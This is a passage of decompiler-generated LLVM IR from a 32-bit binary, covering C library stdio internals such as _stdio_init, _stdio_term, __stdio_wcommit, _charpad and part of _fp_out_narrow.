  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804dfee = call i32 @malloc(i32 4096)
  store i32 %v1_804dfee, i32* %eax.global-to-local, align 4
  %v1_804dff6 = load i32, i32* @ebp, align 4
  %v2_804dff6 = add i32 %v1_804dff6, 8
  %v3_804dff6 = inttoptr i32 %v2_804dff6 to i32*
  store i32 %v1_804dfee, i32* %v3_804dff6, align 4
  %v1_804dff9 = icmp eq i32 %v1_804dfee, 0
  %v0_804e00d = load i32, i32* @ebp, align 4
  br i1 %v1_804dff9, label %dec_label_pc_804e00d, label %dec_label_pc_804dffd

dec_label_pc_804dffd:                             ; preds = %dec_label_pc_804dfe6
  %v1_804dffd = inttoptr i32 %v0_804e00d to i16*
  %v2_804dffd = load i16, i16* %v1_804dffd, align 2
  %v3_804dffd = or i16 %v2_804dffd, 16384
  store i16 %v3_804dffd, i16* %v1_804dffd, align 2
  %v1_804e003 = add i32 %v1_804dfee, 4096
  store i32 %v1_804e003, i32* %eax.global-to-local, align 4
  %v1_804e008 = load i32, i32* @ebp, align 4
  %v2_804e008 = add i32 %v1_804e008, 12
  %v3_804e008 = inttoptr i32 %v2_804e008 to i32*
  store i32 %v1_804e003, i32* %v3_804e008, align 4
  br label %dec_label_pc_804e014

dec_label_pc_804e00d:                             ; preds = %dec_label_pc_804dfe6
  %v1_804e00d = add i32 %v0_804e00d, 12
  %v2_804e00d = inttoptr i32 %v1_804e00d to i32*
  store i32 0, i32* %v2_804e00d, align 4
  br label %dec_label_pc_804e014

dec_label_pc_804e014:                             ; preds = %dec_label_pc_804df9e, %dec_label_pc_804dffd, %dec_label_pc_804e00d
  %v0_804e014 = load i32, i32* @ebp, align 4
  %v1_804e014 = add i32 %v0_804e014, 8
  %v2_804e014 = inttoptr i32 %v1_804e014 to i32*
  %v3_804e014 = load i32, i32* %v2_804e014, align 4
  store i32 %v3_804e014, i32* %eax.global-to-local, align 4
  %v1_804e017 = add i32 %v0_804e014, 2
  %v2_804e017 = inttoptr i32 %v1_804e017 to i8*
  store i8 0, i8* %v2_804e017, align 1
  %v0_804e01b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e01b = load i32, i32* @ebp, align 4
  %v2_804e01b = add i32 %v1_804e01b, 24
  %v3_804e01b = inttoptr i32 %v2_804e01b to i32*
  store i32 %v0_804e01b, i32* %v3_804e01b, align 4
  %v0_804e01e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e01e = load i32, i32* @ebp, align 4
  %v2_804e01e = add i32 %v1_804e01e, 28
  %v3_804e01e = inttoptr i32 %v2_804e01e to i32*
  store i32 %v0_804e01e, i32* %v3_804e01e, align 4
  %v0_804e021 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e021 = load i32, i32* @ebp, align 4
  %v2_804e021 = add i32 %v1_804e021, 16
  %v3_804e021 = inttoptr i32 %v2_804e021 to i32*
  store i32 %v0_804e021, i32* %v3_804e021, align 4
  %v0_804e024 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e024 = load i32, i32* @ebp, align 4
  %v2_804e024 = add i32 %v1_804e024, 20
  %v3_804e024 = inttoptr i32 %v2_804e024 to i32*
  store i32 %v0_804e024, i32* %v3_804e024, align 4
  %v0_804e027 = load i32, i32* @ebp, align 4
  %v1_804e027 = add i32 %v0_804e027, 44
  %v2_804e027 = inttoptr i32 %v1_804e027 to i32*
  store i32 0, i32* %v2_804e027, align 4
  %v0_804e02e = load i32, i32* @ebp, align 4
  %v1_804e02e = add i32 %v0_804e02e, 1
  %v2_804e02e = inttoptr i32 %v1_804e02e to i8*
  %v3_804e02e = load i8, i8* %v2_804e02e, align 1
  %v4_804e02e = and i8 %v3_804e02e, 32
  %v5_804e02e = icmp eq i8 %v4_804e02e, 0
  %v0_804e032 = load i32, i32* @global_var_80598ac.198, align 4
  store i32 %v0_804e032, i32* @eax, align 4
  %v2_804e037 = add i32 %v0_804e02e, 52
  %v3_804e037 = inttoptr i32 %v2_804e037 to i32*
  store i32 %v0_804e032, i32* %v3_804e037, align 4
  br i1 %v5_804e02e, label %dec_label_pc_804e0a9, label %dec_label_pc_804e03c

dec_label_pc_804e03c:                             ; preds = %dec_label_pc_804e014
  %v2_804e047 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e047, i32* %stack_var_-76, align 4
  %v2_804e04c = call i32 @__pthread_return_void(i32 %v2_804e047, i32 134550975)
  store i32 %v2_804e04c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059894.195 to i32), i32* %stack_var_-76, align 4
  %v1_804e058 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059894.195 to i32))
  store i32 %v1_804e058, i32* @eax, align 4
  %v2_804e06a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e06a, i32* %stack_var_-76, align 4
  %v2_804e06f = call i32 @__pthread_return_void(i32 %v2_804e06a, i32 134550975)
  store i32 %v2_804e06f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805987c.199 to i32), i32* %stack_var_-76, align 4
  %v1_804e07b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805987c.199 to i32))
  %v0_804e080 = load i32, i32* bitcast (i32** @global_var_8059878.200 to i32*), align 8
  store i32 %v0_804e080, i32* @eax, align 4
  %v1_804e085 = load i32, i32* @ebp, align 4
  %v2_804e085 = add i32 %v1_804e085, 32
  %v3_804e085 = inttoptr i32 %v2_804e085 to i32*
  store i32 %v0_804e080, i32* %v3_804e085, align 4
  %v0_804e088 = load i32, i32* @ebp, align 4
  store i32 %v0_804e088, i32* bitcast (i32** @global_var_8059878.200 to i32*), align 8
  %v2_804e08e = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804e08e, i32* @ecx, align 4
  store i32 %v2_804e06a, i32* %stack_var_-76, align 4
  %v2_804e093 = call i32 @__pthread_return_void(i32 %v2_804e06a, i32 1)
  store i32 %v2_804e06a, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804e047, i32* %stack_var_-76, align 4
  %v2_804e09d = call i32 @__pthread_return_void(i32 %v2_804e047, i32 1)
  store i32 %v2_804e09d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0a2

dec_label_pc_804e0a2:                             ; preds = %dec_label_pc_804decf, %dec_label_pc_804e03c
  br label %dec_label_pc_804e0a9

dec_label_pc_804e0a7:                             ; preds = %dec_label_pc_804dec5, %dec_label_pc_804deb2
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e0a9

dec_label_pc_804e0a9:                             ; preds = %dec_label_pc_804e014, %dec_label_pc_804defe, %dec_label_pc_804e0a2, %dec_label_pc_804e0a7
  %v0_804e0ac = load i32, i32* @ebp, align 4
  store i32 %v0_804e0ac, i32* %eax.global-to-local, align 4
  %v2_804e0ae = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e0ae, i32* @ebx, align 4
  store i32 %v0_804de86, i32* @esi, align 4
  store i32 %v0_804de85, i32* @edi, align 4
  store i32 %v0_804de84, i32* @ebp, align 4
  ret i32 %v0_804e0ac

; uselistorder directives
  uselistorder i32 %v2_804e06a, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804e047, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804e00d, { 1, 0 }
  uselistorder i32 %v1_804dfee, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804dfd5, { 1, 0 }
  uselistorder i32 %v1_804dfbe, { 1, 0, 2 }
  uselistorder i32 %v11_804df80, { 1, 0 }
  uselistorder i32 %v0_804df89.pre, { 1, 0 }
  uselistorder i32 %v1_804df51, { 1, 0 }
  uselistorder i32 %v0_804df4d, { 1, 0 }
  uselistorder i32 %v1_804df42, { 1, 0, 2 }
  uselistorder i32 %v1_804df03, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804def2, { 1, 0 }
  uselistorder i32 %v0_804dec5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 21, 27, 28, 29 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_804e0a9, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e0a2, { 1, 0 }
  uselistorder label %dec_label_pc_804e014, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804df83, { 1, 0 }
  uselistorder label %dec_label_pc_804df73, { 1, 0 }
  uselistorder label %dec_label_pc_804df30, { 1, 0 }
  uselistorder label %dec_label_pc_804defa, { 1, 0 }
  uselistorder label %dec_label_pc_804deec, { 1, 0 }
  uselistorder label %dec_label_pc_804dee1, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e0b5 = load i32, i32* @edi, align 4
  %v0_804e0b6 = load i32, i32* @esi, align 4
  %v0_804e0b7 = load i32, i32* @ebx, align 4
  store i32 %v0_804e0b7, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e0c0 = call i32 @__errno_location(i32 %v0_804e0b7)
  store i32 %v1_804e0c0, i32* @edi, align 4
  %v0_804e0ca = load i32, i32* @global_var_80598c0.191, align 64
  store i32 %v0_804e0ca, i32* @esi, align 4
  %v1_804e0d0 = inttoptr i32 %v1_804e0c0 to i32*
  %v2_804e0d0 = load i32, i32* %v1_804e0d0, align 4
  store i32 %v2_804e0d0, i32* %ebp.global-to-local, align 4
  %v1_804e0d4 = call i32 @isatty(i32 0)
  %v0_804e0d9 = load i32, i32* @ebx, align 4
  %v2_804e0db = sub i32 %v0_804e0d9, %v1_804e0d4
  %v2_804e0e6 = mul i32 %v2_804e0db, 256
  %v0_804e0e9 = load i32, i32* @esi, align 4
  %v2_804e0e9 = xor i32 %v0_804e0e9, %v2_804e0e6
  %v1_804e0eb = trunc i32 %v2_804e0e9 to i16
  store i16 %v1_804e0eb, i16* bitcast (i32* @global_var_80598c0.191 to i16*), align 64
  %v0_804e0f2 = load i32, i32* @global_var_8059910.192, align 16
  store i32 %v0_804e0f2, i32* @esi, align 4
  %v1_804e0f8 = call i32 @isatty(i32 1)
  %v0_804e0fd = load i32, i32* @ebx, align 4
  %v2_804e0fd = sub i32 %v0_804e0fd, %v1_804e0f8
  %v2_804e0ff = mul i32 %v2_804e0fd, 256
  %v0_804e102 = load i32, i32* @esi, align 4
  %v2_804e102 = xor i32 %v2_804e0ff, %v0_804e102
  %v1_804e104 = trunc i32 %v2_804e102 to i16
  store i16 %v1_804e104, i16* bitcast (i32* @global_var_8059910.192 to i16*), align 16
  %v0_804e10b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e10b = load i32, i32* @edi, align 4
  %v2_804e10b = inttoptr i32 %v1_804e10b to i32*
  store i32 %v0_804e10b, i32* %v2_804e10b, align 4
  %v2_804e110 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e110, i32* @ebx, align 4
  store i32 %v0_804e0b6, i32* @esi, align 4
  store i32 %v0_804e0b5, i32* @edi, align 4
  ret i32 %v1_804e0f8

; uselistorder directives
  uselistorder i32 %v1_804e0c0, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e123 = inttoptr i32 %arg1 to i16*
  %v4_804e123 = call i32 @memcpy(i16* %v3_804e123, i32 ptrtoint (i32* @global_var_8056de0.201 to i32), i32 24)
  ret i32 %v4_804e123
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e12c = load i32, i32* @esi, align 4
  %v0_804e12d = load i32, i32* @ebx, align 4
  store i32 %v0_804e12d, i32* %stack_var_-8, align 4
  %v1_804e136 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805987c.199 to i32))
  store i32 %v1_804e136, i32* %eax.global-to-local, align 4
  %v1_804e142 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8059894.195 to i32))
  store i32 %v1_804e142, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_8059878.200 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e18c22 = icmp eq i32 %storemerge21, 0
  %v1_804e18e23 = icmp eq i1 %v1_804e18c22, false
  br i1 %v1_804e18e23, label %dec_label_pc_804e14f.lr.ph, label %dec_label_pc_804e1ac.preheader

dec_label_pc_804e14f.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e14f

dec_label_pc_804e14f:                             ; preds = %dec_label_pc_804e14f.lr.ph, %dec_label_pc_804e176
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804e14f.lr.ph ], [ %storemerge, %dec_label_pc_804e176 ]
  %v1_804e152 = add i32 %storemerge24, 56
  store i32 %v1_804e152, i32* @esi, align 4
  %v1_804e156 = call i32 @__pthread_return_0(i32 %v1_804e152)
  store i32 %v1_804e156, i32* %eax.global-to-local, align 4
  %v1_804e15e = icmp eq i32 %v1_804e156, 0
  br i1 %v1_804e15e, label %dec_label_pc_804e176, label %dec_label_pc_804e162

dec_label_pc_804e162:                             ; preds = %dec_label_pc_804e14f
  %v0_804e162 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e162 = add i32 %v0_804e162, 8
  %v2_804e162 = inttoptr i32 %v1_804e162 to i32*
  %v3_804e162 = load i32, i32* %v2_804e162, align 4
  store i32 %v3_804e162, i32* %eax.global-to-local, align 4
  %v1_804e165 = inttoptr i32 %v0_804e162 to i16*
  store i16 48, i16* %v1_804e165, align 2
  %v0_804e16a = load i32, i32* %eax.global-to-local, align 4
  %v1_804e16a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e16a = add i32 %v1_804e16a, 24
  %v3_804e16a = inttoptr i32 %v2_804e16a to i32*
  store i32 %v0_804e16a, i32* %v3_804e16a, align 4
  %v0_804e16d = load i32, i32* %eax.global-to-local, align 4
  %v1_804e16d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e16d = add i32 %v1_804e16d, 28
  %v3_804e16d = inttoptr i32 %v2_804e16d to i32*
  store i32 %v0_804e16d, i32* %v3_804e16d, align 4
  %v0_804e170 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e170 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e170 = add i32 %v1_804e170, 16
  %v3_804e170 = inttoptr i32 %v2_804e170 to i32*
  store i32 %v0_804e170, i32* %v3_804e170, align 4
  %v0_804e173 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e173 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e173 = add i32 %v1_804e173, 20
  %v3_804e173 = inttoptr i32 %v2_804e173 to i32*
  store i32 %v0_804e173, i32* %v3_804e173, align 4
  br label %dec_label_pc_804e176

dec_label_pc_804e176:                             ; preds = %dec_label_pc_804e14f, %dec_label_pc_804e162
  %v0_804e179 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e179 = add i32 %v0_804e179, 52
  %v2_804e179 = inttoptr i32 %v1_804e179 to i32*
  store i32 1, i32* %v2_804e179, align 4
  %v0_804e180 = load i32, i32* @esi, align 4
  %v1_804e181 = call i32 @__stdio_init_mutex(i32 %v0_804e180)
  store i32 %v1_804e181, i32* %eax.global-to-local, align 4
  %v0_804e186 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e186 = add i32 %v0_804e186, 32
  %v2_804e186 = inttoptr i32 %v1_804e186 to i32*
  %storemerge = load i32, i32* %v2_804e186, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e18c = icmp eq i32 %storemerge, 0
  %v1_804e18e = icmp eq i1 %v1_804e18c, false
  br i1 %v1_804e18e, label %dec_label_pc_804e14f, label %dec_label_pc_804e189.dec_label_pc_804e1ac.preheader_crit_edge

dec_label_pc_804e189.dec_label_pc_804e1ac.preheader_crit_edge: ; preds = %dec_label_pc_804e176
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8059878.200 to i32*), align 4
  br label %dec_label_pc_804e1ac.preheader

dec_label_pc_804e1ac.preheader:                   ; preds = %dec_label_pc_804e189.dec_label_pc_804e1ac.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e189.dec_label_pc_804e1ac.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e1ac3 = icmp eq i32 %storemerge12, 0
  %v1_804e1ae10 = icmp eq i1 %v1_804e1ac3, false
  br i1 %v1_804e1ae10, label %dec_label_pc_804e198.preheader, label %dec_label_pc_804e1b0

dec_label_pc_804e198.preheader:                   ; preds = %dec_label_pc_804e1ac.preheader
  br label %dec_label_pc_804e198

dec_label_pc_804e198:                             ; preds = %dec_label_pc_804e198.preheader, %dec_label_pc_804e1a9
  %v0_804e1a0 = phi i32 [ %storemerge1, %dec_label_pc_804e1a9 ], [ %storemerge12, %dec_label_pc_804e198.preheader ]
  %v1_804e198 = inttoptr i32 %v0_804e1a0 to i8*
  %v2_804e198 = load i8, i8* %v1_804e198, align 1
  %v3_804e198 = and i8 %v2_804e198, 64
  %v4_804e198 = icmp eq i8 %v3_804e198, 0
  br i1 %v4_804e198, label %dec_label_pc_804e1a9, label %dec_label_pc_804e19d

dec_label_pc_804e19d:                             ; preds = %dec_label_pc_804e198
  %v1_804e1a1 = call i32 @__stdio_wcommit(i32 %v0_804e1a0)
  store i32 %v1_804e1a1, i32* %eax.global-to-local, align 4
  %v0_804e1a9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e1a9

dec_label_pc_804e1a9:                             ; preds = %dec_label_pc_804e198, %dec_label_pc_804e19d
  %v0_804e1a9 = phi i32 [ %v0_804e1a0, %dec_label_pc_804e198 ], [ %v0_804e1a9.pre, %dec_label_pc_804e19d ]
  %v1_804e1a9 = add i32 %v0_804e1a9, 32
  %v2_804e1a9 = inttoptr i32 %v1_804e1a9 to i32*
  %storemerge1 = load i32, i32* %v2_804e1a9, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e1ac = icmp eq i32 %storemerge1, 0
  %v1_804e1ae = icmp eq i1 %v1_804e1ac, false
  br i1 %v1_804e1ae, label %dec_label_pc_804e198, label %dec_label_pc_804e1b0

dec_label_pc_804e1b0:                             ; preds = %dec_label_pc_804e1a9, %dec_label_pc_804e1ac.preheader
  %v2_804e1b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e1b0, i32* %eax.global-to-local, align 4
  %v2_804e1b1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e1b1, i32* @ebx, align 4
  store i32 %v0_804e12c, i32* @esi, align 4
  ret i32 %v2_804e1b0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804e1a9, { 1, 0 }
  uselistorder label %dec_label_pc_804e198, { 1, 0 }
  uselistorder label %dec_label_pc_804e176, { 1, 0 }
  uselistorder label %dec_label_pc_804e14f, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e1b4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e1bc = add i32 %arg1, 8
  %v2_804e1bc = inttoptr i32 %v1_804e1bc to i32*
  %v3_804e1bc = load i32, i32* %v2_804e1bc, align 4
  store i32 %v3_804e1bc, i32* %edx.global-to-local, align 4
  %v1_804e1bf = add i32 %arg1, 16
  %v2_804e1bf = inttoptr i32 %v1_804e1bf to i32*
  %v3_804e1bf = load i32, i32* %v2_804e1bf, align 4
  %v2_804e1c2 = sub i32 %v3_804e1bf, %v3_804e1bc
  %v12_804e1c2 = icmp eq i32 %v2_804e1c2, 0
  store i32 %v2_804e1c2, i32* %eax.global-to-local, align 4
  br i1 %v12_804e1c2, label %dec_label_pc_804e1d5, label %dec_label_pc_804e1c6

dec_label_pc_804e1c6:                             ; preds = %entry
  store i32 %v3_804e1bc, i32* %v2_804e1bf, align 4
  %v0_804e1c9 = load i32, i32* @ecx, align 4
  %v0_804e1ca = load i32, i32* %eax.global-to-local, align 4
  %v0_804e1cb = load i32, i32* %edx.global-to-local, align 4
  %v0_804e1cc = load i32, i32* @ebx, align 4
  %v4_804e1cd = inttoptr i32 %v0_804e1cc to i16*
  %v5_804e1cd = call i32 @__stdio_WRITE(i16* %v4_804e1cd, i32 %v0_804e1cb, i32 %v0_804e1ca, i32 %v0_804e1c9)
  store i32 %v5_804e1cd, i32* %eax.global-to-local, align 4
  %v0_804e1d5.pre = load i32, i32* @ebx, align 4
  %v2_804e1db.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e1d5

dec_label_pc_804e1d5:                             ; preds = %entry, %dec_label_pc_804e1c6
  %v2_804e1db = phi i32 [ %tmp11, %entry ], [ %v2_804e1db.pre, %dec_label_pc_804e1c6 ]
  %v0_804e1d5 = phi i32 [ %arg1, %entry ], [ %v0_804e1d5.pre, %dec_label_pc_804e1c6 ]
  %v1_804e1d5 = add i32 %v0_804e1d5, 16
  %v2_804e1d5 = inttoptr i32 %v1_804e1d5 to i32*
  %v3_804e1d5 = load i32, i32* %v2_804e1d5, align 4
  store i32 %v3_804e1d5, i32* %eax.global-to-local, align 4
  %v2_804e1d8 = add i32 %v0_804e1d5, 8
  %v3_804e1d8 = inttoptr i32 %v2_804e1d8 to i32*
  %v4_804e1d8 = load i32, i32* %v3_804e1d8, align 4
  %v5_804e1d8 = sub i32 %v3_804e1d5, %v4_804e1d8
  store i32 %v5_804e1d8, i32* %eax.global-to-local, align 4
  store i32 %v2_804e1db, i32* @edx, align 4
  store i32 %v0_804e1b4, i32* @ebx, align 4
  ret i32 %v5_804e1d8

; uselistorder directives
  uselistorder i32 %v0_804e1d5, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e1d5, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e1e0 = load i32, i32* @edi, align 4
  %v0_804e1e1 = load i32, i32* @esi, align 4
  %v0_804e1e2 = load i32, i32* @ebx, align 4
  %v0_804e1e3 = load i32, i32* @eax, align 4
  store i32 %v0_804e1e3, i32* @edi, align 4
  %v0_804e1e8 = load i32, i32* @ecx, align 4
  store i32 %v0_804e1e8, i32* @esi, align 4
  store i32 %v0_804e1e8, i32* @ebx, align 4
  %v0_804e1ec = load i32, i32* @edx, align 4
  store i32 %v0_804e1ec, i32* %stack_var_-13, align 4
  %v1_804e1f32 = icmp eq i32 %v0_804e1e8, 0
  br i1 %v1_804e1f32, label %dec_label_pc_804e20b, label %dec_label_pc_804e1f7.lr.ph

dec_label_pc_804e1f7.lr.ph:                       ; preds = %entry
  %v2_804e1f7 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e1f7

dec_label_pc_804e1f2:                             ; preds = %dec_label_pc_804e1f7
  %v1_804e1f2 = add i32 %v0_804e1f2, -1
  %v8_804e1f2 = icmp eq i32 %v1_804e1f2, 0
  store i32 %v1_804e1f2, i32* @ebx, align 4
  br i1 %v8_804e1f2, label %dec_label_pc_804e20b.loopexit, label %dec_label_pc_804e1f2.dec_label_pc_804e1f7_crit_edge

dec_label_pc_804e1f2.dec_label_pc_804e1f7_crit_edge: ; preds = %dec_label_pc_804e1f2
  %v0_804e1fb.pre = load i32, i32* @edx, align 4
  %v0_804e1fc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e1f7

dec_label_pc_804e1f7:                             ; preds = %dec_label_pc_804e1f2.dec_label_pc_804e1f7_crit_edge, %dec_label_pc_804e1f7.lr.ph
  %v0_804e1fc = phi i32 [ %v0_804e1fc.pre, %dec_label_pc_804e1f2.dec_label_pc_804e1f7_crit_edge ], [ %v0_804e1e3, %dec_label_pc_804e1f7.lr.ph ]
  %v0_804e1fb = phi i32 [ %v0_804e1fb.pre, %dec_label_pc_804e1f2.dec_label_pc_804e1f7_crit_edge ], [ %v0_804e1ec, %dec_label_pc_804e1f7.lr.ph ]
  %v4_804e200 = call i32 @__stdio_fwrite(i32 %v2_804e1f7, i32 1, i32 %v0_804e1fc, i32 %v0_804e1fb)
  %v8_804e208 = icmp eq i32 %v4_804e200, 1
  %v0_804e1f2 = load i32, i32* @ebx, align 4
  br i1 %v8_804e208, label %dec_label_pc_804e1f2, label %dec_label_pc_804e20b.loopexit

dec_label_pc_804e20b.loopexit:                    ; preds = %dec_label_pc_804e1f2, %dec_label_pc_804e1f7
  %v1_804e20b.ph = phi i32 [ %v0_804e1f2, %dec_label_pc_804e1f7 ], [ 0, %dec_label_pc_804e1f2 ]
  %v0_804e20b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e20b

dec_label_pc_804e20b:                             ; preds = %dec_label_pc_804e20b.loopexit, %entry
  %v0_804e20b = phi i32 [ 0, %entry ], [ %v0_804e20b.pre, %dec_label_pc_804e20b.loopexit ]
  %v1_804e20b = phi i32 [ 0, %entry ], [ %v1_804e20b.ph, %dec_label_pc_804e20b.loopexit ]
  %v2_804e20b = sub i32 %v0_804e20b, %v1_804e20b
  store i32 %v0_804e1e2, i32* @ebx, align 4
  store i32 %v0_804e1e1, i32* @esi, align 4
  store i32 %v0_804e1e0, i32* @edi, align 4
  ret i32 %v2_804e20b

; uselistorder directives
  uselistorder i32 %v1_804e1f2, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e20b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e229 = trunc i32 %arg2 to i8
  %v5_804e229 = icmp slt i8 %v3_804e229, 0
  %v1_804e22b = icmp eq i1 %v5_804e229, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e22b, label %dec_label_pc_804e25c, label %dec_label_pc_804e22d

dec_label_pc_804e22d:                             ; preds = %entry
  %v3_804e234 = call i32 @strlen(i8* %arg4)
  %v0_804e23c = load i32, i32* @ebx, align 4
  %v2_804e23c = sub i32 %v0_804e23c, %v3_804e234
  store i32 %v2_804e23c, i32* @ebx, align 4
  store i32 %v3_804e234, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e23c, 1
  br i1 %tmp23, label %dec_label_pc_804e25a, label %dec_label_pc_804e244

dec_label_pc_804e244:                             ; preds = %dec_label_pc_804e22d
  %v0_804e244 = load i32, i32* @edi, align 4
  %v1_804e244 = urem i32 %v0_804e244, 128
  store i32 %v1_804e244, i32* @edi, align 4
  store i32 %v2_804e23c, i32* @ecx, align 4
  store i32 %v1_804e244, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804e24f = call i32 @_charpad()
  store i32 %v0_804e24f, i32* @ebp, align 4
  %v12_804e256 = icmp eq i32 %v0_804e24f, %v2_804e23c
  %v1_804e258 = icmp eq i1 %v12_804e256, false
  br i1 %v1_804e258, label %dec_label_pc_804e276, label %dec_label_pc_804e244.dec_label_pc_804e25a_crit_edge

dec_label_pc_804e244.dec_label_pc_804e25a_crit_edge: ; preds = %dec_label_pc_804e244
  %v0_804e25a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e25a

dec_label_pc_804e25a:                             ; preds = %dec_label_pc_804e244.dec_label_pc_804e25a_crit_edge, %dec_label_pc_804e22d
  %v0_804e25a = phi i32 [ %v0_804e25a.pre, %dec_label_pc_804e244.dec_label_pc_804e25a_crit_edge ], [ %v3_804e234, %dec_label_pc_804e22d ]
  store i32 %v0_804e25a, i32* @ebx, align 4
  br label %dec_label_pc_804e25c

dec_label_pc_804e25c:                             ; preds = %entry, %dec_label_pc_804e25a
  %v0_804e267 = phi i32 [ %arg3, %entry ], [ %v0_804e25a, %dec_label_pc_804e25a ]
  %tmp24 = icmp slt i32 %v0_804e267, 1
  br i1 %tmp24, label %dec_label_pc_804e274, label %dec_label_pc_804e262

dec_label_pc_804e262:                             ; preds = %dec_label_pc_804e25c
  %v0_804e262 = load i32, i32* @ecx, align 4
  %v5_804e26c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e267, i32 %arg1, i32 %v0_804e262)
  br label %dec_label_pc_804e274

dec_label_pc_804e274:                             ; preds = %dec_label_pc_804e25c, %dec_label_pc_804e262
  %v1_804e274 = phi i32 [ 0, %dec_label_pc_804e25c ], [ %v5_804e26c, %dec_label_pc_804e262 ]
  %v0_804e274 = load i32, i32* @ebp, align 4
